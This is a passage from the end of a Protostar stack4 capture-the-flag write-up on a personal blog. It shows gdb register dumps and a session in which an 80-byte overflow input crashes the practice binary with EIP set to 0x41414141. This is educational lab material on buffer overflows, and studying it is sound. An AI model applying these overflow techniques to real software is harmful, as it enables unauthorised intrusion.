<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eax            0xbffffd64       -1073742492</span><br><span class="line">ecx            0x104270a        17049354</span><br><span class="line">edx            0x1      1</span><br><span class="line">ebx            0xb7fd7ff4       -1208123404</span><br><span class="line">esp            0xbffffc60       0xbffffc60</span><br><span class="line">ebp            0xbffffcb8       0xbffffcb8</span><br><span class="line">esi            0x0      0</span><br><span class="line">edi            0x0      0</span><br><span class="line">eip            0x8048411        0x8048411 &lt;main+9&gt;</span><br><span class="line">eflags         0x200286 [ PF SF IF ID ]</span><br><span class="line">cs             0x73     115</span><br><span class="line">ss             0x7b     123</span><br><span class="line">ds             0x7b     123</span><br><span class="line">es             0x7b     123</span><br><span class="line">fs             0x0      0</span><br><span class="line">gs             0x33     51</span><br></pre></td></tr></table></figure>
</li>
<li><p>esp start with 0xbffffc60 and end 0xbffffcc0 size is 96 bytes</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break main</span><br><span class="line">Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.</span><br><span class="line">(gdb) shell python -c &apos;print &quot;A&quot;*80 &apos; &gt; /tmp/stack4</span><br><span class="line">(gdb) r &lt; /tmp/stack4</span><br><span class="line">Starting program: /opt/protostar/bin/stack4 &lt; /tmp/stack4</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbffffd64) at stack4/stack4.c:15</span><br><span class="line">15      stack4/stack4.c: No such file or directory.</span><br><span class="line">        in stack4/stack4.c</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41414141 in ?? ()</span><br></pre></td></tr></table></figure>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">AllIHave</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Protostar-stack-challenge-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Protostar stack challenge Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-1"><span class="toc-number">1.1.</span> <span class="toc-text">Challenge 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-2"><span class="toc-number">1.2.</span> <span class="toc-text">Challenge 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-3"><span class="toc-number">1.3.</span> <span class="toc-text">Challenge 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-4"><span class="toc-number">1.4.</span> <span class="toc-text">challenge 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge-5"><span class="toc-number">1.5.</span> <span class="toc-text">challenge 5</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&text=Protostar Stack Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&is_video=false&description=Protostar Stack Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Protostar Stack Writeup&body=Check out this article: http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&title=Protostar Stack Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/27/Protostar-Stack-Writeup/&name=Protostar Stack Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Kyaw Thiha
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">AllIHave</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


